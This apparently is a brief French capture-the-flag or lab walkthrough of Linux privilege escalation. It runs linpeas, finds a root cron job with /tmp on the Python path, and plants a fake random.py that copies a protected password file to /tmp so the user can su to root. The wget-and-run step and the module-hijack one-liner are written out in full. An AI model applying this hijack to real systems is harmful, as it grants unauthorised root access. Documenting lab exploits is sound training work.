## ÉTAPES

### Linpeas - Inspection
- Téléchargement du script linpeas depuis le compte user :
> wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
- Lancement du script
> chmod +x linpeas.sh
./linpeas.sh
- Potentielle failles détecté
		- Processe cron executé sous root
		- Dans les crontab, un script python /root/script.py est executer toute les 2 minutes, en ajoutant /tmp au PYTHONENV
		- Dans les fichiers modifié sous 5min, on voit un /etc/toremember.txt auquel l'user n'a pas accès

### Escalation
- L'user a la permission read sur le script /root/script.py:
> cat /root/script.py

On voit que la librairie python random est utilisé
- Création d'un faux module random.py pour userper la lib officiel et afficher le contenu du fichier /etc/toremember.txt
> echo 'import os; os.system("cat /etc/toremember.txt > /tmp/root_pass")' > /tmp/random.py
- Après 2min le script /root/script.py est executé et vient lancer notre script random.py
- L'user peut accèder au contenu du fichier:
> cat /tmp/root_pass
- L'user obtient le mot de passe et peut changer de compte pour avoir des privilèges root
> su root
